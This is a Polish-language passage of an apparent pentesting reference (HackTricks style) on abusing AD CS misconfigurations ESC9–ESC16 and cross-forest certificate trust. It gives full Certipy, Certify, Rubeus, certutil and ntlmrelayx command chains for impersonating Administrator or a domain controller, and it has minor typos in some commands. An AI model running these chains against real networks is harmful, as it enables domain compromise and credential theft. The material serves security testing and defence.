Załóżmy, że `John@corp.local` ma uprawnienia `GenericWrite` nad `Jane@corp.local`, z celem skompromitowania `Administrator@corp.local`. Szablon certyfikatu `ESC9`, w którym `Jane@corp.local` ma prawo się zarejestrować, jest skonfigurowany z flagą `CT_FLAG_NO_SECURITY_EXTENSION` w ustawieniu `msPKI-Enrollment-Flag`.

Początkowo hash `Jane` zostaje pozyskany przy użyciu Shadow Credentials, dzięki uprawnieniom `GenericWrite` Johna:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Następnie `userPrincipalName` użytkownika `Jane` zostaje zmieniony na `Administrator`, celowo pomijając część domenową `@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Ta modyfikacja nie narusza ograniczeń, ponieważ `Administrator@corp.local` pozostaje odrębny jako `userPrincipalName` użytkownika `Administrator`.

Następnie szablon certyfikatu `ESC9`, oznaczony jako podatny, jest żądany przez `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Zauważono, że `userPrincipalName` certyfikatu odzwierciedla `Administrator`, pozbawiony jakiegokolwiek „object SID”.

Następnie `userPrincipalName` użytkowniczki `Jane` zostaje przywrócone do jej pierwotnego `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Próba uwierzytelnienia przy użyciu wydanego certyfikatu teraz zwraca hash NT użytkownika `Administrator@corp.local`. Polecenie musi zawierać `-domain <domain>` z powodu braku określenia domeny w certyfikacie:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Weak Certificate Mappings - ESC10

### Wyjaśnienie

ESC10 odnosi się do dwóch wartości kluczy rejestru na kontrolerze domeny:

- Domyślna wartość dla `CertificateMappingMethods` pod `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` to `0x18` (`0x8 | 0x10`), wcześniej ustawiona na `0x1F`.
- Domyślne ustawienie dla `StrongCertificateBindingEnforcement` pod `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` to `1`, wcześniej `0`.

### Przypadek 1

Gdy `StrongCertificateBindingEnforcement` jest skonfigurowany jako `0`.

### Przypadek 2

Jeśli `CertificateMappingMethods` zawiera bit `UPN` (`0x4`).

### Przypadek nadużycia 1

Gdy `StrongCertificateBindingEnforcement` jest ustawiony na `0`, konto A z uprawnieniami `GenericWrite` może zostać wykorzystane do przejęcia dowolnego konta B.

Na przykład mając uprawnienia `GenericWrite` do `Jane@corp.local`, atakujący dąży do przejęcia `Administrator@corp.local`. Procedura jest analogiczna do ESC9, umożliwiając użycie dowolnego szablonu certyfikatu.

Na początku hash `Jane` jest pozyskiwany przy użyciu Shadow Credentials, wykorzystując `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Następnie wartość `userPrincipalName` użytkownika `Jane` zostaje zmieniona na `Administrator`, celowo pomijając część `@corp.local`, aby uniknąć naruszenia ograniczenia.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Następnie jako `Jane` zostaje wystąpione o certyfikat umożliwiający uwierzytelnianie klienta, korzystając z domyślnego szablonu `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
Następnie wartość `userPrincipalName` użytkownika `Jane` zostaje przywrócona do pierwotnej: `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Uwierzytelnienie uzyskanym certyfikatem zwróci NT hash `Administrator@corp.local`, dlatego w poleceniu trzeba określić domenę, ponieważ certyfikat nie zawiera informacji o domenie.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Scenariusz nadużycia 2

Jeśli `CertificateMappingMethods` zawiera flagę bitową `UPN` (`0x4`), konto A z uprawnieniami `GenericWrite` może przejąć dowolne konto B nieposiadające właściwości `userPrincipalName`, w tym konta maszynowe oraz wbudowane konto administratora domeny `Administrator`.

Tutaj celem jest przejęcie `DC$@corp.local`, zaczynając od uzyskania hasha `Jane` przez Shadow Credentials, wykorzystując `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`userPrincipalName` użytkowniczki `Jane` jest wtedy ustawiony na `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Wystąpiono o certyfikat do uwierzytelniania klienta jako `Jane`, używając domyślnego szablonu `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`userPrincipalName` użytkownika `Jane` zostaje przywrócony do pierwotnej wartości po tym procesie.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Do uwierzytelnienia przez Schannel użyto opcji `-ldap-shell` w Certipy, co wskazuje powodzenie uwierzytelnienia jako `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Za pośrednictwem powłoki LDAP polecenia takie jak `set_rbcd` umożliwiają ataki Resource-Based Constrained Delegation (RBCD), potencjalnie kompromitując kontroler domeny.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Ta luka dotyczy również każdego konta użytkownika, które nie ma ustawionego `userPrincipalName` lub którego `userPrincipalName` nie odpowiada `sAMAccountName`. Domyślne konto `Administrator@corp.local` jest szczególnie atrakcyjnym celem ze względu na podwyższone uprawnienia LDAP i domyślny brak `userPrincipalName`.

## Relaying NTLM to ICPR - ESC11

### Wyjaśnienie

Jeśli CA Server nie jest skonfigurowany z `IF_ENFORCEENCRYPTICERTREQUEST`, umożliwia to przeprowadzenie ataków relay NTLM bez podpisywania za pośrednictwem usługi RPC. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

Możesz użyć `certipy`, aby sprawdzić, czy `Enforce Encryption for Requests` jest Disabled; certipy pokaże wtedy podatności `ESC11`.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Scenariusz nadużycia

Konieczne jest skonfigurowanie serwera przekaźnikowego:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Uwaga: Dla kontrolerów domeny musimy określić `-template` w DomainController.

Lub używając [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) :
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access to ADCS CA with YubiHSM - ESC12

### Wyjaśnienie

Administratorzy mogą skonfigurować Certificate Authority tak, aby była przechowywana na zewnętrznym urządzeniu, takim jak "Yubico YubiHSM2".

Jeżeli urządzenie USB jest podłączone do serwera CA przez port USB, lub przez USB device server w przypadku, gdy serwer CA jest maszyną wirtualną, dla Key Storage Provider wymagany jest authentication key (czasami określany jako "password"), aby generować i wykorzystywać klucze w YubiHSM.

Ten key/password jest przechowywany w rejestrze pod `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` w postaci jawnego tekstu.

Odniesienie w [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Scenariusz nadużycia

Jeśli prywatny klucz CA jest przechowywany na fizycznym urządzeniu USB, to mając shell access możliwe jest odzyskanie klucza.

Najpierw musisz uzyskać certyfikat CA (jest on publiczny) i następnie:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Na koniec użyj polecenia certutil `-sign`, aby sfałszować nowy dowolny certyfikat przy użyciu certyfikatu CA i jego klucza prywatnego.

## OID Group Link Abuse - ESC13

### Wyjaśnienie

Atrybut `msPKI-Certificate-Policy` pozwala dodać politykę wydawania do szablonu certyfikatu. Obiekty `msPKI-Enterprise-Oid`, które są odpowiedzialne za polityki wydawania, można odnaleźć w Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) kontenera PKI OID. Polityka może być powiązana z grupą AD za pomocą atrybutu tego obiektu `msDS-OIDToGroupLink`, co pozwala systemowi autoryzować użytkownika, który przedstawi certyfikat, tak jakby był członkiem tej grupy. [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

Innymi słowy, gdy użytkownik ma uprawnienie do enroll certyfikatu i certyfikat jest powiązany z grupą OID, użytkownik może odziedziczyć uprawnienia tej grupy.

Użyj [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) aby znaleźć OIDToGroupLink:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Scenariusz nadużycia

Znajdź uprawnienie użytkownika — możesz użyć `certipy find` lub `Certify.exe find /showAllPermissions`.

Jeżeli `John` ma uprawnienie do rejestracji `VulnerableTemplate`, użytkownik może odziedziczyć uprawnienia grupy `VulnerableGroup`.

Wystarczy, że określi szablon — otrzyma certyfikat z uprawnieniami OIDToGroupLink.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Niebezpieczna konfiguracja odnowienia certyfikatu - ESC14

### Wyjaśnienie

Opis pod adresem https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping jest niezwykle szczegółowy. Poniżej przytoczono oryginalny tekst.

ESC14 dotyczy luk wynikających ze "słabego jawnego mapowania certyfikatów", głównie przez niewłaściwe wykorzystanie lub niebezpieczną konfigurację atrybutu `altSecurityIdentities` na kontach użytkowników lub komputerów w Active Directory. Ten atrybut wielowartościowy pozwala administratorom ręcznie powiązać certyfikaty X.509 z kontem AD do celów uwierzytelniania. Gdy jest wypełniony, te jawne mapowania mogą zastąpić domyślną logikę mapowania certyfikatów, która zwykle opiera się na UPN lub nazwach DNS w SAN certyfikatu, lub na SID osadzonym w rozszerzeniu bezpieczeństwa `szOID_NTDS_CA_SECURITY_EXT`.

"Ślabe" mapowanie występuje, gdy wartość tekstowa użyta w `altSecurityIdentities` do identyfikacji certyfikatu jest zbyt ogólna, łatwa do odgadnięcia, opiera się na nieunikalnych polach certyfikatu lub używa łatwych do podrobienia komponentów certyfikatu. Jeśli atakujący może uzyskać lub stworzyć certyfikat, którego atrybuty pasują do tak słabo zdefiniowanego jawnego mapowania dla uprzywilejowanego konta, może użyć tego certyfikatu do uwierzytelnienia się jako to konto i podszywania się pod nie.

Przykłady potencjalnie słabych ciągów mapowania w `altSecurityIdentities` obejmują:

- Mapowanie wyłącznie po powszechnym Subject Common Name (CN): np. `X509:<S>CN=SomeUser`. Atakujący może być w stanie uzyskać certyfikat z takim CN z mniej bezpiecznego źródła.
- Używanie zbyt ogólnych Issuer Distinguished Names (DN) lub Subject DNs bez dalszego kwalifikowania, np. konkretnego numeru seryjnego lub subject key identifier: np. `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Stosowanie innych przewidywalnych wzorców lub niekryptograficznych identyfikatorów, które atakujący może być w stanie spełnić w certyfikacie, który może legalnie uzyskać lub sfałszować (jeśli przełamał CA lub znalazł podatny szablon, jak w ESC1).

Atrybut `altSecurityIdentities` obsługuje różne formaty mapowania, takie jak:

- `X509:<I>IssuerDN<S>SubjectDN` (mapuje po pełnych DN wydawcy i DN podmiotu)
- `X509:<SKI>SubjectKeyIdentifier` (mapuje po wartości rozszerzenia Subject Key Identifier certyfikatu)
- `X509:<SR>SerialNumberBackedByIssuerDN` (mapuje po numerze seryjnym, implicitnie kwalifikowanym przez Issuer DN) - to nie jest standardowy format, zwykle jest to `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (mapuje po nazwie RFC822, typowo adresie e-mail, z SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (mapuje po hashu SHA1 surowego klucza publicznego certyfikatu - generalnie silne)

Bezpieczeństwo tych mapowań w dużej mierze zależy od szczegółowości, unikalności i kryptograficznej siły wybranych identyfikatorów certyfikatu użytych w ciągu mapowania. Nawet przy włączonych silnych trybach wiązania certyfikatów na Domain Controllers (które głównie wpływają na mapowania implicit oparte na SAN UPNs/DNS i rozszerzeniu SID), źle skonfigurowany wpis `altSecurityIdentities` nadal może stanowić bezpośrednią drogę do podszywania się, jeśli sama logika mapowania jest wadliwa lub zbyt permisywna.

### Scenariusz nadużycia

ESC14 celuje w **jawne mapowania certyfikatów** w Active Directory (AD), konkretnie w atrybut `altSecurityIdentities`. Jeśli ten atrybut jest ustawiony (zgodnie z zamierzeniem lub przez błędną konfigurację), atakujący może podszyć się pod konta, przedstawiając certyfikaty, które pasują do mapowania.

#### Scenariusz A: Atakujący może zapisać do `altSecurityIdentities`

Precondycja: Atakujący ma uprawnienia zapisu do atrybutu `altSecurityIdentities` docelowego konta lub uprawnienie do jego nadania w postaci jednego z następujących uprawnień na docelowym obiekcie AD:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.

#### Scenariusz B: Cel ma słabe mapowanie przez X509RFC822 (email)

- Precondycja: Cel ma słabe mapowanie X509RFC822 w altSecurityIdentities. Atakujący może ustawić atrybut mail ofiary tak, aby pasował do nazwy X509RFC822 celu, uzyskać certyfikat jako ofiara i użyć go do uwierzytelnienia się jako cel.

#### Scenariusz C: Cel ma mapowanie X509IssuerSubject

- Precondycja: Cel ma słabe jawne mapowanie X509IssuerSubject w `altSecurityIdentities`. Atakujący może ustawić atrybut `cn` lub `dNSHostName` na koncie ofiary, aby pasował do subject mapowania X509IssuerSubject celu. Następnie atakujący może uzyskać certyfikat jako ofiara i użyć tego certyfikatu do uwierzytelnienia się jako cel.

#### Scenariusz D: Cel ma mapowanie X509SubjectOnly

- Precondycja: Cel ma słabe jawne mapowanie X509SubjectOnly w `altSecurityIdentities`. Atakujący może ustawić atrybut `cn` lub `dNSHostName` na koncie ofiary, aby pasował do subject mapowania X509SubjectOnly celu. Następnie atakujący może uzyskać certyfikat jako ofiara i użyć tego certyfikatu do uwierzytelnienia się jako cel.

### konkretne operacje
#### Scenariusz A

Request a certificate of the certificate template `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Zapisz i przekonwertuj certyfikat
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Uwierzytelnij się (przy użyciu certyfikatu)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Sprzątanie (opcjonalne)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
Aby uzyskać bardziej szczegółowe metody ataku w różnych scenariuszach, zapoznaj się z następującym materiałem: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Wyjaśnienie

Opis na https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc jest wyjątkowo wyczerpujący. Poniżej znajduje się cytat oryginalnego tekstu.

Using built-in default version 1 certificate templates, an attacker can craft a CSR to include application policies that are preferred over the configured Extended Key Usage attributes specified in the template. The only requirement is enrollment rights, and it can be used to generate client authentication, certificate request agent, and codesigning certificates using the **_WebServer_** template

### Wykorzystanie

Poniższe odnosi się do [this link]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu), Kliknij, aby zobaczyć bardziej szczegółowe metody użycia.

Polecenie `find` w Certipy może pomóc zidentyfikować szablony V1, które potencjalnie są podatne na ESC15, jeśli CA nie jest załatany.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Scenariusz A: Direct Impersonation via Schannel

**Krok 1: Poproś o certyfikat, wstrzykując "Client Authentication" Application Policy i docelowy UPN.** Atakujący `attacker@corp.local` celuje w `administrator@corp.local`, używając szablonu "WebServer" V1 (który pozwala na enrollee-supplied subject).
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: Wrażliwy szablon V1 z "Enrollee supplies subject".
- `-application-policies 'Client Authentication'`: Wstrzykuje OID `1.3.6.1.5.5.7.3.2` do rozszerzenia Application Policies w CSR.
- `-upn 'administrator@corp.local'`: Ustawia UPN w SAN w celu podszywania się.

**Krok 2: Uwierzytelnij się za pomocą Schannel (LDAPS) używając uzyskanego certyfikatu.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Scenario B: PKINIT/Kerberos Impersonation via Enrollment Agent Abuse

**Step 1: Request a certificate from a V1 template (with "Enrollee supplies subject"), injecting "Certificate Request Agent" Application Policy.** Ten certyfikat ma umożliwić atakującemu (`attacker@corp.local`) zostanie enrollment agentem. Nie podano UPN dla tożsamości atakującego w tym przypadku, ponieważ celem jest funkcja agenta.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: Wstrzykuje OID `1.3.6.1.4.1.311.20.2.1`.

**Krok 2: Użyj certyfikatu "agent", aby zażądać certyfikatu w imieniu docelowego uprzywilejowanego użytkownika.** Jest to krok podobny do ESC3, wykorzystujący certyfikat z Kroku 1 jako certyfikat "agent".
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Krok 3: Uwierzytelnij się jako uprzywilejowany użytkownik, używając certyfikatu "on-behalf-of".**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Rozszerzenie zabezpieczeń wyłączone na CA (globalnie)-ESC16

### Wyjaśnienie

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** odnosi się do scenariusza, w którym, jeśli konfiguracja AD CS nie wymusza dołączenia rozszerzenia **szOID_NTDS_CA_SECURITY_EXT** do wszystkich certyfikatów, atakujący może to wykorzystać poprzez:

1. Zażądanie certyfikatu **bez SID binding**.

2. Użycie tego certyfikatu **do uwierzytelnienia jako dowolne konto**, na przykład podszywanie się pod konto o wysokich uprawnieniach (np. Domain Administrator).

Możesz także odnieść się do tego artykułu, aby dowiedzieć się więcej o szczegółowej zasadzie: https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6

### Wykorzystanie

Poniższe odnosi się do [tego linku](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally). Kliknij, aby zobaczyć bardziej szczegółowe metody użycia.

Aby zidentyfikować, czy środowisko Active Directory Certificate Services (AD CS) jest podatne na **ESC16**
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Krok 1: Odczytaj początkowy UPN konta ofiary (Opcjonalne — do przywrócenia).
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Krok 2: Zaktualizuj UPN konta ofiary na `sAMAccountName` docelowego administratora.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Krok 3: (jeśli to konieczne) Uzyskaj poświadczenia dla konta "victim" (np. za pomocą Shadow Credentials).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Krok 4: Zażądaj certyfikatu jako użytkownik "victim" z _dowolnego odpowiedniego szablonu uwierzytelniania klienta_ (np. "User") na CA podatnej na ESC16.** Ponieważ CA jest podatny na ESC16, automatycznie pominie rozszerzenie bezpieczeństwa SID w wydanym certyfikacie, niezależnie od konkretnych ustawień tego rozszerzenia w szablonie. Ustaw zmienną środowiskową cache poświadczeń Kerberos (polecenie shell):
```bash
export KRB5CCNAME=victim.ccache
```
Następnie zażądaj certyfikatu:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Krok 5: Przywróć UPN konta "ofiary".**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Krok 6: Uwierzytelnij się jako docelowy administrator.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Kompromitacja lasów za pomocą certyfikatów — wyjaśnienie w stronie biernej

### Naruszenie zaufania między lasami przez skompromitowane CA

Konfiguracja dla **cross-forest enrollment** została wykonana stosunkowo prosto. **root CA certificate** z lasu zasobów jest **publikowany do lasów kont** przez administratorów, a certyfikaty **Enterprise CA** z lasu zasobów są **dodawane do kontenerów `NTAuthCertificates` i AIA w każdym lesie kont**. Dla jasności, takie ustawienie daje **CA w lesie zasobów pełną kontrolę** nad wszystkimi innymi lasami, dla których zarządza PKI. Jeśli ta CA zostanie **skompromitowana przez atakujących**, certyfikaty dla wszystkich użytkowników zarówno w lesie zasobów, jak i w lasach kont mogą zostać przez nich **sfałszowane**, łamiąc tym samym granicę bezpieczeństwa lasu.

### Uprawnienia do rejestracji przyznane obcym podmiotom

W środowiskach wielo-lasowych należy zachować ostrożność w odniesieniu do Enterprise CA, które **publikują szablony certyfikatów** pozwalające **Authenticated Users lub foreign principals** (użytkownicy/grupy spoza lasu, do którego należy Enterprise CA) na **uprawnienia do rejestracji i edycji**.\
Po uwierzytelnieniu w ramach trustu, AD dodaje do tokenu użytkownika **Authenticated Users SID**. Zatem jeżeli domena posiada Enterprise CA z szablonem, który **pozwala Authenticated Users na uprawnienia do rejestracji**, szablon mógłby potencjalnie zostać **zarejestrowany przez użytkownika z innego lasu**. Podobnie, jeśli **uprawnienia do rejestracji są wyraźnie przyznane obcemu podmiotowi przez szablon**, w ten sposób zostaje utworzona **relacja kontroli dostępu między lasami (cross-forest)**, umożliwiając podmiotowi z jednego lasu **rejestrację w szablonie z innego lasu**.

Oba scenariusze prowadzą do **zwiększenia powierzchni ataku** z jednego lasu na drugi. Ustawienia szablonu certyfikatu mogą zostać wykorzystane przez atakującego do uzyskania dodatkowych uprawnień w obcej domenie.


## References

- [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../../banners/hacktricks-training.md}}
